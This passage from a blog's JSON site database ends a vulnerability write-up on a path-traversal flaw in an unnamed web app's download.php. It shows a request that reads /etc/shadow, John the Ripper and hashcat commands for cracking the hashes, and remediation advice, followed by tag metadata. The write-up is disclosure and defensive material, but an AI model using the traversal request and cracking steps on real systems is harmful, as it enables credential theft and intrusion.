REDACTED\nSec-Ch-Ua: &quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;104&quot;\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: &quot;Windows&quot;\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-Dest: iframe\nReferer: https://192.168.1.87/XXX/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nConnection: close</code></pre>\n\n<p>To:<br><code>GET /XXX/php/file_transfer/download.php?download=/etc/shadow&amp;csrf=yourCSRFtoken HTTP/1.1</code></p>\n<p>We can leverage this to download the &#x2F;etc&#x2F;shadow and &#x2F;etc&#x2F;password file, unshadow them, then crack the passwords to login as root via SSH and&#x2F;or reuse the credentials somewhere else in the network.</p>\n<h2 id=\"Bonus-Points\"><a href=\"#Bonus-Points\" class=\"headerlink\" title=\"Bonus Points\"></a>Bonus Points</h2><h4 id=\"Using-John-The-Ripper\"><a href=\"#Using-John-The-Ripper\" class=\"headerlink\" title=\"Using John The Ripper:\"></a>Using John The Ripper:</h4><pre><code class=\"hljs plaintext\">unshadow passwd shadow\njohn --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt</code></pre>\n\n<h4 id=\"Using-Hashcat\"><a href=\"#Using-Hashcat\" class=\"headerlink\" title=\"Using Hashcat:\"></a>Using Hashcat:</h4><p>With hashcat we don’t have to unshadow the files to match the users to the the hashes like John the ripper.<br>Feed Hashcat the shadow file with -m specified for  <code>1800 | sha512crypt $6$, SHA512 (Unix) | Operating System</code></p>\n<pre><code class=\"hljs plaintext\">hashcat -m 1800 -a 0 shadow.txt /usr/share/wordlists/rockyou1.txt</code></pre>\n\n\n<h2 id=\"Remediation\"><a href=\"#Remediation\" class=\"headerlink\" title=\"Remediation\"></a>Remediation</h2><p>The vulnerable code can be found in the download.php file. </p>\n<pre><code class=\"hljs plaintext\">if (isset($_GET[&#x27;download&#x27;])) &#123;\n    $downloadPath = $_GET[&#x27;download&#x27;];</code></pre>\n\n<p>What could be done to make this more secure is:</p>\n<ol>\n<li>Check if the file is allowed to be accessed before downloading. Whitelisting acceptable file paths for example.</li>\n<li>Remove the ability for users to modify the path of the file downloaded.</li>\n<li>Make sure that the web server user has the least amount of privilege necessary to accomplish the task.</li>\n</ol>\n<h2 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h2><p>I will come out with a PoC script to automate exploitation of the vuln along with more details when the vuln is officially allowed to be disclosed. With proper protections put in place this vuln shouldn’t even be possible to execute anyway. </p>\n"}],"PostAsset":[],"PostCategory":[],"PostTag":[{"post_id":"clz07c5iz0000m3cp2ovgaldd","tag_id":"clz07c5js0002m3cpbr85gam9","_id":"clz07c5kr000bm3cp0elr0pl5"},{"post_id":"clz07c5iz0000m3cp2ovgaldd","tag_id":"clz07c5k80006m3cpcsqoevwx","_id":"clz07c5kw000dm3cpfuz32dcy"},{"post_id":"clz07c5jk0001m3cpbpujdav6","tag_id":"clz07c5js0002m3cpbr85gam9","_id":"clz07c5l6000jm3cp2lvf9780"},{"post_id":"clz07c5jk0001m3cpbpujdav6","tag_id":"clz07c5kx000em3cp62l65k11","_id":"clz07c5l8000lm3cpcav0gnut"},{"post_id":"clz07c5jz0003m3cp10ygaosn","tag_id":"clz07c5js0002m3cpbr85gam9","_id":"clz07c5lh000rm3cp7c14as7m"},{"post_id":"clz07c5jz0003m3cp10ygaosn","tag_id":"clz07c5l9000mm3cphex185dl","_id":"clz07c5ll000tm3cpb9u6bbax"},{"post_id":"clz07c5lc000om3cpckjk4gnz","tag_id":"clz07c5k80006m3cpcsqoevwx","_id":"clz07c5lp000vm3cp7ke56hlb"},{"post_id":"clz07c5k20004m3cpbjzc0rj3","tag_id":"clz07c5ld000pm3cpc38ydo0e","_id":"clz07c5lr000xm3cp4o3t4r2f"},{"post_id":"clz07c5k20004m3cpbjzc0rj3","tag_id":"clz07c5ln000um3cphskvek24","_id":"clz07c5ls000ym3cphon31878"},{"post_id":"clz07c5k20004m3cpbjzc0rj3","tag_id":"clz07c5js0002m3cpbr85gam9","_id":"clz07c5lu0010m3cpgaze1gmh"},{"post_id":"clz07c5k50005m3cp3n9xbwfk","tag_id":"clz07c5k80006m3cpcsqoevwx","_id":"clz07c5lw0012m3cpb1l9dbme"},{"post_id":"clz07c5k50005m3cp3n9xbwfk","tag_id":"clz07c5ls000zm3cpfefsey2p","_id":"clz07c5lx0013m3cp27ai3ywd"},{"post_id":"clz07c5kb0007m3cpaloo1994","tag_id":"clz07c5k80006m3cpcsqoevwx","_id":"clz07c5ly0015m3cpg7g5057o"},{"post_id":"clz07c5kb0007m3cpaloo1994","tag_id":"clz07c5lv0011m3cp51cffixb","_id":"clz07c5ly0016m3cpabk41ugt"},{"post_id":"clz07c5ke0008m3cpcv5pebvt","tag_id":"clz07c5k80006m3cpcsqoevwx","_id":"clz07c5m00018m3cpbz30g4wb"},{"post_id":"clz07c5ke0008m3cpcv5pebvt","tag_id":"clz07c5ld000pm3cpc38ydo0e","_id":"clz07c5m00019m3cpbqew1e80"},{"post_id":"clz07c5ko000am3cp2olw2s0l","tag_id":"clz07c5lz0017m3cp7ap314ju","_id":"clz07c5m2001bm3cp5i9xh9i2"},{"post_id":"clz07c5kt000cm3cp7uxf00bk","tag_id":"clz07c5m1001am3cpau840rov","_id":"clz07c5m8001em3cpe139gtgp"},{"post_id":"clz07c5kt000cm3cp7uxf00bk","tag_id":"clz07c5m3001cm3cp2fd13ktf","_id":"clz07c5m8001fm3cpfcmr571k"},{"post_id":"clz07c5kz000fm3cp9y19ck0f","tag_id":"clz07c5m4001dm3cphof22roh","_id":"clz07c5mc001im3cp6or8dhwr"},{"post_id":"clz07c5kz000fm3cp9y19ck0f","tag_id":"clz07c5m9001gm3cpamnl1xpo","_id":"clz07c5mc001jm3cpdy890ue9"},{"post_id":"clz07c5l2000gm3cphx0u1dpn","tag_id":"clz07c5kx000em3cp62l65k11","_id":"clz07c5me001lm3cp5ycpbxps"},{"post_id":"clz07c5l2000gm3cphx0u1dpn","tag_id":"clz07c5js0002m3cpbr85gam9","_id":"clz07c5mf001mm3cpdk8r2k3m"},{"post_id":"clz07c5l2000gm3cphx0u1dpn","tag_id":"clz07c5m1001am3cpau840rov","_id":"clz07c5mg001om3cpdtdu4msr"},{"post_id":"clz07c5l5000im3cp4p2w53y6","tag_id":"clz07c5k80006m3cpcsqoevwx","_id":"clz07c5mh001pm3cpg65z8tiw"},{"post_id":"clz07c5l5000im3cp4p2w53y6","tag_id":"clz07c5ls000zm3cpfefsey2p","_id":"clz07c5mj001rm3cp78083o67"},{"post_id":"clz07c5l7000km3cp46jn25s9","tag_id":"clz07c5ld000pm3cpc38ydo0e","_id":"clz07c5mj001sm3cpb7mq3khy"},{"post_id":"clz07c5l7000km3cp46jn25s9","tag_id":"clz07c5k80006m3cpcsqoevwx","_id":"clz07c5ml001um3cp03f17c2x"},{"post_id":"clz07c5la000nm3cpbqc61q5v","tag_id":"clz07c5js0002m3cpbr85gam9","_id":"clz07c5ml001vm3cphjli2bem"},{"post_id":"clz07c5la000nm3cpbqc61q5v","tag_id":"clz07c5mh001qm3cpeympesi9","_id":"clz07c5mm001wm3cpfv9lfi6v"},{"post_id":"clz07c5le000qm3cp5ofegjm0","tag_id":"clz07c5lz0017m3cp7ap314ju","_id":"clz07c5mm001xm3cpa30o21g8"},{"post_id":"clz07c5le000qm3cp5ofegjm0","tag_id":"clz07c5l9000mm3cphex185dl","_id":"clz07c5mo001ym3cpfajb0e0g"}],"Tag":[{"name":"ctf","_id":"clz07c5js0002m3cpbr85gam9"},{"name":"Certification","_id":"clz07c5k80006m3cpcsqoevwx"},{"name":"HackTheBox","_id":"clz07c5kx000em3cp62l65k11"},{"name":"Web","_id":"clz07c5l9000mm3cphex185dl"},{"name":"pwn","_id":"clz07c5ld000pm3cpc38ydo0e"},{"name":"Crackme","_id":"clz07c5ln000um3cphskvek24"},{"name":"Review","_id":"clz07c5ls000zm3cpfefsey2p"},{"name":"Blue Team","_id":"clz07c5lv0011m3cp51cffixb"},{"name":"CVE","_id":"clz07c5lz0017m3cp7ap314ju"},{"name":"Linux","_id":"clz07c5m1001am3cpau840rov"},{"name":"Workflow","_id":"clz07c5m3001cm3cp2fd13ktf"},{"name":"Ransomware","_id":"clz07c5m4001dm3cphof22roh"},{"name":"Malware analysis","_id":"clz07c5m9001gm3cpamnl1xpo"},{"name":"Video","_id":"clz07c5mh001qm3cpeympesi9"}]}}